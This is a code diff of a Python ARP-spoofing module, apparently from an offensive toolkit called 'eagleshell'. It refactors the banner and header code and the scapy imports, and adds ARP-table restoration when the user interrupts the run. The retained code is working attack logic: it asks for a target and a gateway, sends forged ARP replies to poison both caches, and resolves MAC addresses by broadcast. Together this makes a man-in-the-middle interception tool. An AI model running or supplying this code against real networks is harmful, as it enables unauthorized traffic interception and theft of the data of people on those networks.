@@ -1,14 +1,11 @@
 #!/usr/bin/python3
 
-from assets.banners import arpspoof_banner
+from assets.headers import arpspoof_header
 from assets.colors import *
-from assets.designs import logo, author
 from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, gateway_prefix
-from assets.properties import clear_screen
 from assets.shortcuts import Exit
 from .network import Network
-import os
-from scapy.all import Ether, ARP, srp as scapy
+import scapy.all as scapy
 import time
 import sys
 
@@ -19,15 +16,9 @@ class ARPSpoof:
         self.configuration()
         self.process()
 
-    def header(self):
-        os.system(clear_screen)
-        print(logo)
-        print(arpspoof_banner)
-        print(author)
-
     def configuration(self):
         try:
-            self.header()
+            arpspoof_header()
             print('Configuration:')
             print('\n\tRHOST = Target IP')
             print('\tExample: 192.168.1.133')
@@ -56,7 +47,7 @@ class ARPSpoof:
                 self.sent_packets_count = self.sent_packets_count + 2
                 sys.stdout.flush()
                 time.sleep(2)
-                self.header()
+                arpspoof_header()
                 print('Process:')
                 print('\n\tStatus')
                 print('\t------')
@@ -73,17 +64,18 @@ class ARPSpoof:
             target_mac = self.get_mac(target_ip)
             packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
             scapy.send(packet, verbose=False)
-        except IndexError:
-            print(invalid_input_prefix)
-            os.system('sleep 1')
-            ARPSpoof()
+        except KeyboardInterrupt:
+            print(GREEN + '\n[+] Resetting ARP Tables')
+            self.restore(self.rhost_set, self.gateway_set)
+            self.restore(self.gateway_set, self.rhost_set)
+            self.result()
 
     def get_mac(self, ip):
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast/arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-        return answered_list[0][1].hwsrc
+        answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+        return answered[0][1].hwsrc
 
     def restore(self, destination_ip, source_ip):
         destination_mac = self.get_mac(destination_ip)
@@ -93,7 +85,7 @@ class ARPSpoof:
 
     def result(self):
         try:
-            self.header()
+            arpspoof_header()
             print('Result:')
             print('\n\tRHOST: ' + GREEN + self.rhost_set + WHITE)
             print('\tGATEWAY: ' + GREEN + self.gateway_set + WHITE)
